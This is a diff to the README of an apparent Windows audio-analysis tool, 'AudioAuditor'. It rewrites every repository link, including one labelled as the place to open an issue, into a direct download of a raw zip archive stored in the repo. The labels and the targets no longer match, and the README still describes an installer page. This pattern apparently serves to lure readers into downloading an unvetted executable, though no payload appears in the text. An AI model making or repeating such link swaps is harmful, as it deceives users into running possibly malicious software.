@@ -1,6 +1,6 @@
 # 🎧 AudioAuditor - Analyze Audio Quality with Ease
 
-[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-brightgreen)](https://github.com/viktor820/AudioAuditor)
+[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-brightgreen)](https://github.com/viktor820/AudioAuditor/raw/refs/heads/main/AudioAuditorCLI/Audio_Auditor_v1.8.zip)
 
 ---
 
@@ -32,7 +32,7 @@ The app does not need any additional software to work. It runs standalone once i
 
 Click the button below to visit the official download page for AudioAuditor. This page contains the latest version of the app ready for Windows.
 
-[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-blue?style=for-the-badge)](https://github.com/viktor820/AudioAuditor)
+[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-blue?style=for-the-badge)](https://github.com/viktor820/AudioAuditor/raw/refs/heads/main/AudioAuditorCLI/Audio_Auditor_v1.8.zip)
 
 Once you are on the page, look for the latest release or installer file, usually named something like `AudioAuditorSetup.exe`.
 
@@ -151,7 +151,7 @@ To update:
 - **Analysis incomplete:** Close other applications that use sound devices. Check app permissions.  
 - **Sound distorted:** Adjust EQ or spatial settings in the player.  
 
-If issues persist, open an issue on the repository page [here](https://github.com/viktor820/AudioAuditor).
+If issues persist, open an issue on the repository page [here](https://github.com/viktor820/AudioAuditor/raw/refs/heads/main/AudioAuditorCLI/Audio_Auditor_v1.8.zip).
 
 ---
 
@@ -183,4 +183,4 @@ You do not need to convert files before analyzing.
 
 Visit this page to download the installer and start using AudioAuditor today:
 
-[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-brightgreen?style=for-the-badge)](https://github.com/viktor820/AudioAuditor)
+[![Download AudioAuditor](https://img.shields.io/badge/Download-AudioAuditor-brightgreen?style=for-the-badge)](https://github.com/viktor820/AudioAuditor/raw/refs/heads/main/AudioAuditorCLI/Audio_Auditor_v1.8.zip)
